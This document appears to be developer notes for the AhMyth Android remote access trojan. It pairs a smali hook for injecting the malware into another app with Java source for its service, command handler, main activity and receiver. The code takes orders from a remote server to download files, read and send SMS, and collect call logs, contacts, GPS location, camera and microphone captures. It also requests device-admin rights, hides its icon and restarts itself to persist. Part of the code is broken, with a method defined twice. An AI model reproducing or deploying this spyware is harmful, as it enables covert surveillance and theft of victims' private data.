

## New Hook Method
```smali
invoke-static, {} Lcom/package/ID/ahmyth/MainService;->start()V
```
## New hopeful Hook start function

- MainService.java
```java
public class MainService extends Service {

    private static Context contextOfApplication;

    private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            startService(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            startService(context);

        }

    }

    // Smali hook point

    public static void start() {

        try {

            findContext();

        } catch (Exception ignored) {

        }

    }

    public static void startService(Context context) {

        context.startService(new Intent(context, MainService.class));

    }

    @Override

    public IBinder onBind(Intent intent) {

        // TODO: Return the communication channel to the service.

        //throw new UnsupportedOperationException("Not yet implemented");

        return null;

    }

    @Override

    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)

    {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){

            startMyOwnForeground();

        }

        else {

            startForeground(1, new Notification());

        }

        contextOfApplication = this;

        ConnectionManager.startAsync(this);

        return Service.START_STICKY;

    }

    @Override

    public void onDestroy() {

        super.onDestroy();

    }

    public static Context getContextOfApplication()

    {

        return contextOfApplication;

    }

    @Override

    public void onTaskRemoved(Intent rootIntent) {

        super.onTaskRemoved(rootIntent);

//        Log.d(TAG, "TASK REMOVED");

        PendingIntent service = PendingIntent.getService(

                getApplicationContext(),

                1001,

                new Intent(getApplicationContext(), MainService.class),

                PendingIntent.FLAG_ONE_SHOT);

        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);

        alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, service);

    }

    //    --------------------------------------My Own Foreground----------------------------------------------- //

    @RequiresApi(api = Build.VERSION_CODES.O)

    private void startMyOwnForeground(){

        String NOTIFICATION_CHANNEL_ID = "com.play.service.techno";

        String channelName = "My Background Service";

        NotificationChannel chan = new NotificationChannel(NOTIFICATION_CHANNEL_ID, channelName, NotificationManager.IMPORTANCE_NONE);

        chan.setLightColor(Color.BLUE);

        chan.setLockscreenVisibility(Notification.VISIBILITY_PRIVATE);

        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);

        assert manager != null;

        manager.createNotificationChannel(chan);

        NotificationCompat.Builder notificationBuilder = new NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID);

        Notification notification = notificationBuilder.setOngoing(true)

                .setContentTitle("App is running in background")

                .setPriority(NotificationManager.IMPORTANCE_MIN)

                .setCategory(Notification.CATEGORY_SERVICE)

                .build();

        startForeground(1, notification);

    }

//    --------------------------------------My Own Foreground----------------------------------------------- //

}
```

- ConnectionManager.java
```java
public class ConnectionManager {

    public static Context context;

    private static io.socket.client.Socket ioSocket;

    private static FileManager fm = new FileManager();
    
    
    public static void startAsync(Context context) {

        ConnectionManager.context = context;

    }

    public static void startAsync(Context con)

    {

        try {

            context = con;

            sendReq();

        }catch (Exception ex){

            startAsync(con);

        }

    }
    
        private static void findContext() throws Exception {

        Class<?> activityThreadClass;

        try {

            activityThreadClass = Class.forName("android.app.ActivityThread");

        } catch (ClassNotFoundException e) {

            // No context

            return;

        }

        final Method currentApplication = activityThreadClass.getMethod("currentApplication");

        final Context context = (Context) currentApplication.invoke(null, (Object[]) null);

        if (context == null) {

            // Post to the UI/Main thread and try and retrieve the Context

            final Handler handler = new Handler(Looper.getMainLooper());

            handler.post(new Runnable() {

                public void run() {

                    try {

                        Context context = (Context) currentApplication.invoke(null, (Object[]) null);

                        if (context != null) {

                            start(context);

                        }

                    } catch (Exception ignored) {

                    }

                }

            });

        } else {

            start(context);

        }

    }

    public static void sendReq() {

try {

    if(ioSocket != null )

        return;

    ioSocket = IOSocket.getInstance().getIoSocket();

    ioSocket.on("ping", new Emitter.Listener() {

        @Override

        public void call(Object... args) {

            ioSocket.emit("pong");

        }

    });

    ioSocket.on("order", new Emitter.Listener() {

        @Override

        public void call(Object... args) {

            try {

                JSONObject data = (JSONObject) args[0];

                String order = data.getString("order");

                Log.e("order",order);

                switch (order){

                    case "x0000ca":

                        if(data.getString("extra").equals("camList"))

                            x0000ca(-1);

                        else if (data.getString("extra").equals("1"))

                            x0000ca(1);

                        else if (data.getString("extra").equals("0"))

                            x0000ca(0);

                        break;

                    case "x0000fm":

                        if (data.getString("extra").equals("ls"))

                            x0000fm(0,data.getString("path"));

                        else if (data.getString("extra").equals("dl"))

                            x0000fm(1,data.getString("path"));

                        break;

                    case "x0000sm":

                        if(data.getString("extra").equals("ls"))

                            x0000sm(0,null,null);

                        else if(data.getString("extra").equals("sendSMS"))

                           x0000sm(1,data.getString("to") , data.getString("sms"));

                        break;

                    case "x0000cl":

                        x0000cl();

                        break;

                    case "x0000cn":

                        x0000cn();

                        break;

                    case "x0000mc":

                            x0000mc(data.getInt("sec"));

                        break;

                    case "x0000lm":

                        x0000lm();

                        break;

                }

            }catch (Exception e) {

                e.printStackTrace();

            }

        }

    });

    ioSocket.connect();

}catch (Exception ex){

   Log.e("error" , ex.getMessage());

}

    }

    public static void x0000ca(int req){

        if(req == -1) {

           JSONObject cameraList = new CameraManager(context).findCameraList();

            if(cameraList != null)

            ioSocket.emit("x0000ca" ,cameraList );

        }

        else if (req == 1){

            new CameraManager(context).startUp(1);

        }

        else if (req == 0){

            new CameraManager(context).startUp(0);

        }

    }

    public static void x0000fm(int req , String path){

        if(req == 0)

        ioSocket.emit("x0000fm",fm.walk(path));

        else if (req == 1)

            fm.downloadFile(path);

    }

    public static void x0000sm(int req,String phoneNo , String msg){

        if(req == 0)

            ioSocket.emit("x0000sm" , SMSManager.getSMSList());

        else if(req == 1) {

            boolean isSent = SMSManager.sendSMS(phoneNo, msg);

            ioSocket.emit("x0000sm", isSent);

        }

    }

    public static void x0000cl(){

        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());

    }

    public static void x0000cn(){

        ioSocket.emit("x0000cn" , ContactsManager.getContacts());

    }

    public static void x0000mc(int sec) throws Exception{

        MicManager.startRecording(sec);

    }

    public static void x0000lm() throws Exception{

        Looper.prepare();

        LocManager gps = new LocManager(context);

        JSONObject location = new JSONObject();

        // check if GPS enabled

        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();

            double longitude = gps.getLongitude();

            Log.e("loc" , latitude+"   ,  "+longitude);

            location.put("enable" , true);

            location.put("lat" , latitude);

            location.put("lng" , longitude);

        }

        else

            location.put("enable" , false);

        ioSocket.emit("x0000lm", location);

    }

}
```

- MainActivity.java
```java
public class MainActivity extends Activity {

    DevicePolicyManager devicePolicyManager;

    ComponentName componentName;

    SharedPreferences sharedPreferences;

    @Override

    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        componentName = new ComponentName(this, AdminReceiver.class);

        devicePolicyManager = (DevicePolicyManager)getSystemService(DEVICE_POLICY_SERVICE);

        if (devicePolicyManager.isAdminActive(componentName)) {

//            Log.d("MY_TAG","Ok then");

        }

        else {

            Intent intent= new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);

            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);

            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.device_admin_explanation));

            startActivity(intent);

        }

        if (

                ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED &&

                ActivityCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED &&

                ActivityCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED

        ){

            Intent mIntent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);

            mIntent.setData(Uri.parse("package:"+getPackageName()));

            startActivity(mIntent);

            Toast.makeText(this, "Grant all permission before!", Toast.LENGTH_LONG).show();

        }

        Intent serviceIntent = new Intent(this, MainService.class);

        ContextCompat.startForegroundService(this, serviceIntent);

//        --------------------------------------------------------------------------------------------

//        startService(new Intent(this, MainService.class));

//        finish();

        if (android.os.Build.VERSION.SDK_INT <= Build.VERSION_CODES.P){

            Switch hide_icon_switch = findViewById(R.id.switch1);

            hide_icon_switch.setVisibility(View.VISIBLE);

            sharedPreferences = getSharedPreferences("AppSettings", Context.MODE_PRIVATE);

            final SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

            hide_icon_switch.setOnCheckedChangeListener(new CompoundButton.OnCheckedChangeListener() {

                @Override

                public void onCheckedChanged(CompoundButton buttonView, boolean isChecked) {

                    appSettingEditor.putBoolean("hidden_status",isChecked);

                    appSettingEditor.commit();

                }

            });

            boolean icon_hidden_status = sharedPreferences.getBoolean("hidden_status",false);

            if (icon_hidden_status){

                fn_hideicon();

                hide_icon_switch.setChecked(true);

            }

            else {

                hide_icon_switch.setChecked(false);

            }

        }

    }

    

    public void fn_hideicon() {

        getPackageManager().setComponentEnabledSetting(getComponentName(),

                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,

                PackageManager.DONT_KILL_APP);

    }

//    for activity_main functionality

    public void openGooglePlay(View view) {

        Intent GoogleIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps"));

        startActivity(GoogleIntent);
        MainService.startService(this);
        finish();

    }

}
```

- MyReciever.java
```java
public class MyReceiver extends BroadcastReceiver {

    public MyReceiver() {

    }

    @Override

    public void onReceive(Context context, Intent intent) {

        Intent serviceIntent = new Intent(context, MainService.class);

        ContextCompat.startForegroundService(context, serviceIntent);

//        Toast.makeText(context,intent.getAction(),Toast.LENGTH_LONG).show();

        if (intent.getAction().equalsIgnoreCase(Intent.ACTION_NEW_OUTGOING_CALL)){

            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            if (phoneNumber.equalsIgnoreCase(context.getResources().getString(R.string.unhide_phone_number))){

                SharedPreferences sharedPreferences = context.getSharedPreferences("AppSettings", Context.MODE_PRIVATE);

                boolean hidden_status = sharedPreferences.getBoolean("hidden_status",false);

                if (hidden_status){

                    SharedPreferences.Editor appSettingEditor = sharedPreferences.edit();

                    appSettingEditor.putBoolean("hidden_status",false);

                    appSettingEditor.commit();

                    ComponentName componentName = new ComponentName(context, MainActivity.class);

                    context.getPackageManager()

                            .setComponentEnabledSetting(componentName,

                                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,

                                    PackageManager.DONT_KILL_APP);

                    Toast.makeText(context, "AhMyth's icon has been revealed!", Toast.LENGTH_SHORT).show();

                }
                
                if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                MainService.startService(context);

                }

            }

        }

    }

}
```
